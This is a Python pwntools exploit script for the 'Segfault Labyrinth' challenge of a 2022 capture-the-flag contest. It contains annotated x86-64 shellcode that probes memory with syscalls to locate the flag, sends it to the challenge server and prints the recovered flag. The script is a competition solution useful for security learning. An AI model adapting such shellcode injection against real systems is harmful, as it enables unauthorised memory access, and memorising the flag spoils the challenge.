
# A custom template for binary exploitation that uses pwntools.
# Examples:
#   python exploit.py DEBUG NOASLR GDB
#   python exploit.py DEBUG REMOTE

from pwn import *

# Set up pwntools for the correct architecture. See `context.binary/arch/bits/endianness` for more
context.binary = elfexe = ELF('./challenge')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, disable ASLR and run through GDB
# for all created processes: 
# $ ./exploit.py DEBUG NOASLR GDB
# You can also run the remote or local target with the option REMOTE
# Feasibility of remote debugging is possible only via ssh (not netcat) and depends from the remote system
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([elfexe.path] + argv, gdbscript, elfexe.path, *a, *kw)
    else:
        target = process([elfexe.path] + argv, *a, **kw)
    return target

# Specify your gdb script here for debugging. gdb will be launched the GDB argument is given.
# gdbscript = '''
# # init-gef
# # target record-full # Not supported with AVX instructions yet

# # continue
# '''.format(**locals())
with open('gdbscript', 'r') as f:
    gdbscript = f.read()

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Generate flag.txt: `python -c 'print("A"*0x1000, end="")' > flag.txt`

arguments = []
if args['REMOTE']:
    remote_server = 'segfault-labyrinth.2022.ctfcompetition.com'
    remote_port = 1337
    io = remote(remote_server, remote_port)
else:
    io = start(arguments)

io.recvline() # Welcome to the Segfault Labyrinth\n
# io.interactive()


# **************************************************************
# *                          FUNCTION                          *
# **************************************************************
#                         undefined shellcode()
#         undefined         AL:1           <RETURN>
#                         shellcode                                       XREF[2]:     001020a0, 00102160(*)  
# 001011e9 90              NOP
# 001011ea 90              NOP
# 001011eb 90              NOP
# 001011ec 90              NOP
# 001011ed 48 89 f8        MOV        RAX,RDI
# 001011f0 48 05 00        ADD        RAX,0x100
#          01 00 00
# 001011f6 c7 40 00        MOV        dword ptr [RAX],0x67616c66
#          66 6c 61 67
# 001011fd c7 40 04        MOV        dword ptr [RAX + 0x4],0x7478742e
#          2e 74 78 74
# 00101204 c6 40 08 00     MOV        byte ptr [RAX + 0x8],0x0
# 00101208 49 89 c6        MOV        R14,RAX
# 0010120b 90              NOP
# 0010120c 90              NOP
# 0010120d 90              NOP
# 0010120e 90              NOP
# 0010120f 90              NOP
# 00101210 90              NOP
# 00101211 90              NOP
# 00101212 90              NOP
# 00101213 90              NOP
# 00101214 90              NOP
# 00101215 90              NOP
# 00101216 90              NOP
# 00101217 90              NOP
# 00101218 90              NOP
# 00101219 90              NOP
# 0010121a 90              NOP
# 0010121b 90              NOP
# 0010121c 90              NOP
# 0010121d 90              NOP
# 0010121e 90              NOP
# 0010121f 90              NOP
# 00101220 48 89 fb        MOV        RBX,RDI
# 00101223 4d 31 ff        XOR        R15,R15
#                         outer_body                                      XREF[1]:     00101259(j)  
# 00101226 4d 31 ed        XOR        R13,R13
#                         inner_body                                      XREF[1]:     0010124c(j)  
# 00101229 49 8d 3e        LEA        RDI,[R14]
# 0010122c 4a 8b 34 eb     MOV        RSI,qword ptr [RBX + R13*0x8]
# 00101230 48 81 c6        ADD        RSI,0x100
#          00 01 00 00
# 00101237 48 c7 c0        MOV        RAX,0x4
#          04 00 00 00
# 0010123e 0f 05           SYSCALL
# 00101240 48 85 c0        TEST       RAX,RAX
# 00101243 74 09           JZ         breaklabel
# 00101245 49 ff c5        INC        R13
# 00101248 49 83 fd 10     CMP        R13,0x10
# 0010124c 75 db           JNZ        inner_body
#                         breaklabel                                      XREF[1]:     00101243(j)  
# 0010124e 4a 8b 1c eb     MOV        RBX,qword ptr [RBX + R13*0x8]
# 00101252 49 ff c7        INC        R15
# 00101255 49 83 ff 0a     CMP        R15,0xa
# 00101259 75 cb           JNZ        outer_body
# 0010125b 90              NOP
#                         now perform the write syscall
# 0010125c bf 01 00        MOV        EDI,0x1
#          00 00
# 00101261 48 89 de        MOV        RSI,RBX
# 00101264 48 c7 c2        MOV        RDX,0x1000
#          00 10 00 00
# 0010126b 48 c7 c0        MOV        RAX,0x1
#          01 00 00 00
# 00101272 0f 05           SYSCALL
# 00101274 90              NOP
# 00101275 f1              INT1
# 00101276 90              NOP
#                         inf_loop                                        XREF[1]:     00101277(j)  
# 00101277 eb fe           JMP        inf_loop
shellcode = b'\x90\x90\x90\x90\x48\x89\xf8\x48\x05\x00\x01\x00\x00\xc7\x40\x00\x66\x6c\x61\x67\xc7\x40\x04\x2e\x74\x78\x74\xc6\x40\x08\x00\x49\x89\xc6\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x89\xfb\x4d\x31\xff\x4d\x31\xed\x49\x8d\x3e\x4a\x8b\x34\xeb\x48\x81\xc6\x00\x01\x00\x00\x48\xc7\xc0\x04\x00\x00\x00\x0f\x05\x48\x85\xc0\x74\x09\x49\xff\xc5\x49\x83\xfd\x10\x75\xdb\x4a\x8b\x1c\xeb\x49\xff\xc7\x49\x83\xff\x0a\x75\xcb\x90\xbf\x01\x00\x00\x00\x48\x89\xde\x48\xc7\xc2\x00\x10\x00\x00\x48\xc7\xc0\x01\x00\x00\x00\x0f\x05\x90\xf1\x90\xeb\xfe'
# \xf1 == int1 == hardware debug trap
# \xcc == int3 == software breakpoint trap

assert(len(shellcode) > 0 and len(shellcode) < 4051)
io.send(p64(len(shellcode)))
io.send(shellcode)

# io.interactive()

data = io.recvall(timeout=3)
print(data)
io.close()

# Flag: CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
